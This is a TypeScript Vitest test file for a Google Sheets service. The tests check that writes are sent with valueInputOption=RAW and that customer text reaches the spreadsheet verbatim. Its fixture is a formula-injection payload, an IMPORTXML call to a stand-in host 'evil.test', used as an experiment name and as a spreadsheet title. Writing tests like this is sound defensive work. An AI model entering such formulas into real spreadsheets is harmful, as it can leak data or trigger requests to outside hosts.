import { afterEach, describe, expect, it, vi } from "vitest";

import { createSpreadsheet, overwriteWorksheet } from "@/server/services/google-sheets.service";

/**
 * Formula safety at the HTTP boundary: every write goes out with `valueInputOption=RAW` and the
 * customer's text exactly as typed. (`lib/sheet-rows.test.ts` covers the rows themselves.)
 */
const SPREADSHEET_ID = "1BxiMVs0XRA5nFMdKvBdBZjgmUUqptlbs74OgvE2upms";
const FORMULA = '=IMPORTXML("http://evil.test/", "//a")';

function stubFetch(body: unknown) {
  const fetchMock = vi.fn(
    async (_url: string, _init?: RequestInit) =>
      new Response(JSON.stringify(body), {
        status: 200,
        headers: { "Content-Type": "application/json" },
      }),
  );
  vi.stubGlobal("fetch", fetchMock);
  return fetchMock;
}

afterEach(() => {
  vi.unstubAllGlobals();
});

describe("overwriteWorksheet", () => {
  it("writes RAW, with a formula-shaped experiment name verbatim", async () => {
    const fetchMock = stubFetch({});
    await overwriteWorksheet(
      "token",
      SPREADSHEET_ID,
      "Routely",
      [["2026-10-19", FORMULA, "Control", 10, 1, 10]],
      0,
    );

    expect(fetchMock).toHaveBeenCalledTimes(1);
    const [url, init] = fetchMock.mock.calls[0]!;
    expect(url).toContain("valueInputOption=RAW");
    expect(url).not.toContain("USER_ENTERED");
    const sent = JSON.parse(String(init?.body)) as { values: unknown[][] };
    expect(sent.values[1]?.[1]).toBe(FORMULA);
  });
});

describe("createSpreadsheet", () => {
  it("sends the customer's name as the title, unchanged", async () => {
    const fetchMock = stubFetch({
      spreadsheetId: SPREADSHEET_ID,
      properties: { title: FORMULA },
      sheets: [{ properties: { sheetId: 7, title: "Routely" } }],
    });
    await createSpreadsheet("token", FORMULA, "Routely").catch(() => undefined);

    const [, init] = fetchMock.mock.calls[0]!;
    const sent = JSON.parse(String(init?.body)) as { properties: { title: string } };
    expect(sent.properties.title).toBe(FORMULA);
  });
});
